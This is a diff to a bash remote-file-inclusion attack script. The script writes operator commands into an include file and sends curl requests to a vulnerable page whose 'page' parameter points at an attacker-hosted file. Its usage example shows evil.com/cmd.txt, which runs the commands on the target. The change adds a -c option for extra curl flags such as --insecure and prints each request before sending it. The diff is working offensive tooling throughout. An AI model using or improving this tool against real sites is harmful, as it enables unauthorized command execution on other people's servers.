@@ -5,8 +5,8 @@ function rfi_template {
 }
 
 function usage {
-	echo "usage: $0 [-f cmd.txt] -u URL"
-	echo "eg   : $0 -f /var/www/hack.txt  -u \"http://vulnsite.com/test.php?page=http://evil.com/cmd.txt\""
+	echo "usage: $0 -f cmd.txt -u URL [-c \"curl-options\"]"
+	echo "eg   : $0 -f /var/www/hack.txt  -u \"https://vulnsite.com/test.php?page=http://evil.com/cmd.txt\" -c \"--insecure\""
 }
 
 if [[ -z $1 ]]; then 
@@ -20,10 +20,11 @@ url=""
 cmdfile=""
 rfifile=""
 
-while getopts "u:f:" OPT; do 
+while getopts ":c:u:f:" OPT; do
 	case $OPT in
 		u) url=$OPTARG;;
 		f) rfifile=$OPTARG;;
+                c) curlopts=$OPTARG;;
 		*) usage; exit 0;;
 	esac
 done
@@ -46,7 +47,8 @@ if [[ ! -z $rfifile ]]; then
 		read cmd
 		rfi_template "${cmd}" ${rfifile}
 		echo "[+] requesting ${url}${prefix}${suffix}"
-		curl "${url}${prefix}${suffix}"
+		echo "curl ${curlopts} ${url}${prefix}${suffix}"
+		curl ${curlopts} "${url}${prefix}${suffix}"
 		echo ""
 	done
 fi
